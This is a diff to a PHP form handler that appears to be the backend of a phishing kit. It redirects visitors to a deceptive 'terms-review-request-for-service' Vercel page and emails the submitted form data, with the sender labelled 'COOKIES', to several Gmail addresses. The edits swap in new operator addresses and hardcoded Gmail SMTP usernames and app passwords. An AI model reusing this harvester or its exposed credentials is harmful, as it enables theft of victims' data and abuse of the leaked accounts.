@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-here-ruby.vercel.app/");
+header("Location: https://terms-review-request-for-service.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -27,15 +27,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
-        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
+        $mail->Username   = 'patjckbang@gmail.com'; // Replace with your email address
+        $mail->Password   = 'wqvv rhzu ydia haut'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('rutherfordhenress@gmail.com', 'COOKIES');
-        $mail->addAddress('rutherfordhenress@gmail.com');
+        $mail->addAddress('rutherfordhenress@gmail.com', 'COOKIES');
+        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
        
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'KAMRAN';
+        $mail->Subject = 'ISMAIL';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
@@ -56,4 +56,3 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     echo "Invalid request!";
 }
 ?>
-
